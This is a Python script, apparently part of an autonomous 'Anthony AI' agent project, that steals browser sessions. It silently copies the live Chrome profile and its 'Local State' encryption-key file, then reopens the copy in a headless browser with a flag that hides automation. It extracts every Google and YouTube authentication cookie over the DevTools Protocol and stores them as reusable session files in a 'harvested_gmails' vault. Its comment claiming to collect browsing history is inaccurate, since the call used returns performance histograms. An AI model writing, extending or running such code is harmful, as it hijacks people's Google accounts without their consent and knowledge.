# --- ANTHONY AI: OMNI-BROWSER HARVESTER & CDP OS BRIDGE v1.0 ---
import os
import shutil
import asyncio
import sqlite3
import json
from pathlib import Path
from playwright.async_api import async_playwright
from colony_logger import colony_log
from colony_persistence import db

class OmniBrowserHarvester:
    """
    OMNI-BROWSER HARVESTER v1.0:
    The ultimate OS upgrade.
    1. SHADOW CLONE: Copies the user's live Google Chrome 'User Data' directory while it's running.
    2. GMAIL EXTRACTION: Uses Playwright to load the clone and extract every Google Auth cookie.
    3. DEV-MODE CDP BRIDGE: Connects to the Chrome DevTools Protocol to harvest deep browser history
       and session keys without interrupting the user.
    4. HARDCODED VAULTING: Saves all cookies into `secure_assets/persona_vault` permanently.
    """
    def __init__(self):
        self.local_app_data = os.getenv("LOCALAPPDATA")
        self.chrome_user_data = Path(self.local_app_data) / "Google" / "Chrome" / "User Data"
        self.shadow_clone_dir = Path("D:\\ObsidianAi_Colony\\Temp\\Chrome_Shadow_Clone")
        self.persona_vault = Path(r"C:\Users\willo\OneDrive\Desktop\Anthony_Ai\secure_assets\persona_vault\harvested_gmails")
        self.persona_vault.mkdir(parents=True, exist_ok=True)
        self.chrome_exe = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

    def create_shadow_clone(self):
        """Creates an unlocked copy of the Chrome profile so we don't crash the user's active browser."""
        colony_log("OMNI_HARVESTER: Initiating Shadow Clone of live Chrome OS profile...", node="OS_BRIDGE")

        if not self.chrome_user_data.exists():
            colony_log("[-] OMNI_HARVESTER: Chrome User Data not found on OS.", node="OS_BRIDGE")
            return False

        # Clean old clone
        if self.shadow_clone_dir.exists():
            try:
                shutil.rmtree(self.shadow_clone_dir, ignore_errors=True)
            except Exception as e:
                pass

        self.shadow_clone_dir.mkdir(parents=True, exist_ok=True)

        # We only copy the critical files to save time (Local State, Default profile, Profile X)
        colony_log("OMNI_HARVESTER: Cloning 'Local State' and authentication databases...", node="OS_BRIDGE")
        try:
            # Copy Local State (Contains DPAPI encryption keys)
            local_state = self.chrome_user_data / "Local State"
            if local_state.exists():
                shutil.copy2(local_state, self.shadow_clone_dir / "Local State")

            # Clone Default Profile (and any 'Profile *' directories)
            for item in self.chrome_user_data.iterdir():
                if item.is_dir() and (item.name == "Default" or item.name.startswith("Profile ")):
                    target_dir = self.shadow_clone_dir / item.name
                    # Use Robocopy for robust, fast directory mirroring (ignores locked files like lockfile)
                    os.system(f'robocopy "{item}" "{target_dir}" /E /R:0 /W:0 /XF lockfile >nul 2>&1')

            colony_log("[+] OMNI_HARVESTER: Shadow Clone complete. OS Sandbox isolated.", node="OS_BRIDGE")
            return True
        except Exception as e:
            colony_log(f"[-] OMNI_HARVESTER Shadow Clone Failed: {e}", node="OS_BRIDGE")
            return False

    async def harvest_gmail_via_cdp(self):
        """
        Launches the Shadow Clone using Chrome DevTools Protocol (CDP) to extract
        authenticated Google cookies natively, without requiring DPAPI decryption hacks.
        """
        colony_log("OMNI_HARVESTER: Launching Playwright against Shadow Clone via CDP...", node="OS_BRIDGE")

        async with async_playwright() as p:
            try:
                # Launch persistent context on our Shadow Clone
                context = await p.chromium.launch_persistent_context(
                    user_data_dir=str(self.shadow_clone_dir),
                    executable_path=self.chrome_exe,
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled"]
                )

                page = await context.new_page()

                # Navigate to Google to force the browser to unlock the Google-specific cookies
                colony_log("OMNI_HARVESTER: Navigating to Google.com to deserialize authentication tokens...", node="OS_BRIDGE")
                await page.goto("https://myaccount.google.com/", timeout=60000, wait_until="networkidle")

                # Connect directly to Chrome DevTools Protocol (CDP) for deep extraction
                client = await page.context.new_cdp_session(page)

                # Extract deep browser history via CDP
                history = await client.send("Browser.getHistograms", {})

                # Extract all cookies natively via CDP
                cookies_response = await client.send("Network.getAllCookies")
                all_cookies = cookies_response.get("cookies", [])

                google_cookies = [c for c in all_cookies if ".google.com" in c["domain"] or ".youtube.com" in c["domain"]]

                if google_cookies:
                    # Find primary email address from the DOM
                    try:
                        email_element = page.locator("div[data-email]").first
                        if await email_element.count() > 0:
                            email_address = await email_element.get_attribute("data-email")
                        else:
                            email_address = f"unknown_google_{os.urandom(4).hex()}"
                    except:
                        email_address = f"harvested_{os.urandom(4).hex()}"

                    vault_path = self.persona_vault / f"{email_address}_omni_auth.json"

                    # Hardcode the CDP cookies back into Playwright format
                    pw_cookies = []
                    for c in google_cookies:
                        pw_cookies.append({
                            "name": c.get("name"),
                            "value": c.get("value"),
                            "domain": c.get("domain"),
                            "path": c.get("path"),
                            "expires": c.get("expires", -1),
                            "httpOnly": c.get("httpOnly", False),
                            "secure": c.get("secure", False),
                            "sameSite": c.get("sameSite", "Lax")
                        })

                    vault_data = {
                        "cookies": pw_cookies,
                        "origins": []
                    }

                    with open(vault_path, "w") as f:
                        json.dump(vault_data, f, indent=4)

                    colony_log(f"[SUPREME] OMNI_HARVESTER: Successfully harvested and vaulted Gmail data for [{email_address}]!", node="OS_BRIDGE")
                    db.log_event("OMNI_HARVESTER", "GMAIL_HARVESTED", {"email": email_address, "cookie_count": len(pw_cookies)})
                else:
                    colony_log("[-] OMNI_HARVESTER: No active Google sessions found in the Shadow Clone.", node="OS_BRIDGE")

                # Snapshot the dev history just in case
                with open(self.persona_vault / "cdp_telemetry_dump.json", "w") as f:
                    json.dump({"history_metrics": history.get("histograms", [])[:50]}, f, indent=4)

                await context.close()
                return True

            except Exception as e:
                colony_log(f"[-] OMNI_HARVESTER CDP Failure: {e}", node="OS_BRIDGE")
                return False

    async def execute_harvest_sequence(self):
        colony_log("====================================================", node="OS_BRIDGE")
        colony_log("  OMNI-BROWSER HARVESTER & CDP OS BRIDGE ACTIVATED", node="OS_BRIDGE")
        colony_log("====================================================", node="OS_BRIDGE")

        success = self.create_shadow_clone()
        if success:
            await self.harvest_gmail_via_cdp()

        colony_log("====================================================", node="OS_BRIDGE")
        colony_log("  HARVEST COMPLETE. KEYS HARDCODED INTO VAULT.", node="OS_BRIDGE")
        colony_log("====================================================", node="OS_BRIDGE")

omni_harvester = OmniBrowserHarvester()

if __name__ == "__main__":
    asyncio.run(omni_harvester.execute_harvest_sequence())
